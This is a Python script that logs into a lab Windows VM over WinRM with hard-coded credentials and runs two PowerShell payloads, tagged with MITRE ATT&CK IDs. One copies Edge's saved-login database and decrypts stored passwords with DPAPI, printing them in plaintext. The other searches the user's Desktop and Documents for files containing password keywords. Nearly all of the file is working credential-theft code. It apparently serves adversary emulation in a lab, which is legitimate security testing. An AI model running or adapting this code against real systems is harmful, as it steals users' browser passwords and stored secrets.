#!/usr/bin/env python3
"""
Complete Credential Extraction - Browser + Files
Shows actual credentials from both Edge browser and file system
"""

import winrm

# Script 1: Browser Credentials
browser_script = r"""
Add-Type -AssemblyName System.Security
$edge = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$temp = "$env:TEMP\e$(Get-Random).db"

Write-Host "`n================================================================" -ForegroundColor Cyan
Write-Host "  BROWSER CREDENTIAL EXTRACTION (T1555.003)" -ForegroundColor Cyan
Write-Host "================================================================`n" -ForegroundColor Cyan

if (Test-Path $edge) {
    Copy-Item $edge $temp -Force
    $bytes = [IO.File]::ReadAllBytes($temp)
    $text = [Text.Encoding]::UTF8.GetString($bytes)
    
    $urls = [regex]::Matches($text, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}') | 
            Select -Expand Value -Unique | Select -First 15
    
    Write-Host "[+] Found $($urls.Count) saved credential entries:" -ForegroundColor Green
    $i=1
    foreach ($u in $urls) { Write-Host "  [$i] $u" -ForegroundColor Yellow; $i++ }
    
    Write-Host "`n[*] Attempting DPAPI password decryption..." -ForegroundColor Cyan
    $found=0
    for ($j=0; $j -lt $bytes.Length-100; $j++) {
        if ($bytes[$j] -eq 1 -and $bytes[$j+1] -eq 0 -and $bytes[$j+2] -eq 0 -and $bytes[$j+3] -eq 0) {
            try {
                $blob = $bytes[$j..($j+255)]
                $dec = [Security.Cryptography.ProtectedData]::Unprotect($blob, $null, 'CurrentUser')
                $pwd = [Text.Encoding]::UTF8.GetString($dec)
                if ($pwd -match '^[\x20-\x7E]{1,50}$') {
                    $found++
                    Write-Host "  Password $found`: " -NoNewline -ForegroundColor Gray
                    Write-Host "$pwd" -ForegroundColor Red
                    if ($found -ge 5) { break }
                }
            } catch {}
        }
    }
    
    if ($found -eq 0) {
        Write-Host "  [!] No passwords decrypted (encrypted with different key or empty)" -ForegroundColor Yellow
    } else {
        Write-Host "`n[+] Decrypted $found passwords!" -ForegroundColor Green
    }
    
    Remove-Item $temp -Force -EA SilentlyContinue
} else {
    Write-Host "[-] Edge database not found" -ForegroundColor Red
}
"""

# Script 2: File-based Credentials
file_script = r"""
Write-Host "`n================================================================" -ForegroundColor Cyan
Write-Host "  FILE-BASED CREDENTIAL SEARCH (T1552.001)" -ForegroundColor Cyan
Write-Host "================================================================`n" -ForegroundColor Cyan

$searchPaths = @("C:\Users\$env:USERNAME\Desktop", "C:\Users\$env:USERNAME\Documents")
$patterns = @("*password*", "*cred*", "*.txt", "*.xml", "*.config")

$found = @()
foreach ($path in $searchPaths) {
    if (Test-Path $path) {
        foreach ($pattern in $patterns) {
            $files = Get-ChildItem -Path $path -Filter $pattern -File -EA SilentlyContinue | Select -First 5
            foreach ($file in $files) {
                $found += $file
            }
        }
    }
}

if ($found.Count -gt 0) {
    Write-Host "[+] Found $($found.Count) potential credential files:" -ForegroundColor Green
    $i=1
    foreach ($f in $found | Select -Unique -First 10) {
        Write-Host "  [$i] $($f.Name) - $([math]::Round($f.Length/1KB,2)) KB" -ForegroundColor Yellow
        $i++
    }
    
    Write-Host "`n[*] Searching for credentials in files..." -ForegroundColor Cyan
    $credCount = 0
    foreach ($f in $found | Select -First 5) {
        try {
            $content = Get-Content $f.FullName -EA SilentlyContinue | Select -First 20
            $matches = $content | Select-String -Pattern "(password|pwd|pass|user|login)" -CaseSensitive:$false
            if ($matches) {
                $credCount++
                Write-Host "  [*] $($f.Name): Found credential keywords" -ForegroundColor Yellow
            }
        } catch {}
    }
    Write-Host "`n[+] Found credential keywords in $credCount files" -ForegroundColor Green
} else {
    Write-Host "[!] No credential files found in search paths" -ForegroundColor Yellow
}

Write-Host "`n================================================================" -ForegroundColor Green
Write-Host "  EXTRACTION COMPLETE" -ForegroundColor Green
Write-Host "================================================================`n" -ForegroundColor Green
"""

print("[*] Connecting to Windows VM (192.168.56.102)...")
session = winrm.Session('http://192.168.56.102:5985/wsman', auth=('akila', '12345678'), transport='ntlm')

print("[+] Connected! Starting credential extraction...")
print("="*70)

# Run browser extraction
result1 = session.run_ps(browser_script)
if result1.status_code == 0:
    print(result1.std_out.decode())
else:
    print("Browser extraction error:", result1.std_err.decode())

# Run file extraction
result2 = session.run_ps(file_script)
if result2.status_code == 0:
    print(result2.std_out.decode())
else:
    print("File extraction error:", result2.std_err.decode())

print("="*70)
print(f"\n[*] Complete! Check output above for extracted credentials.\n")
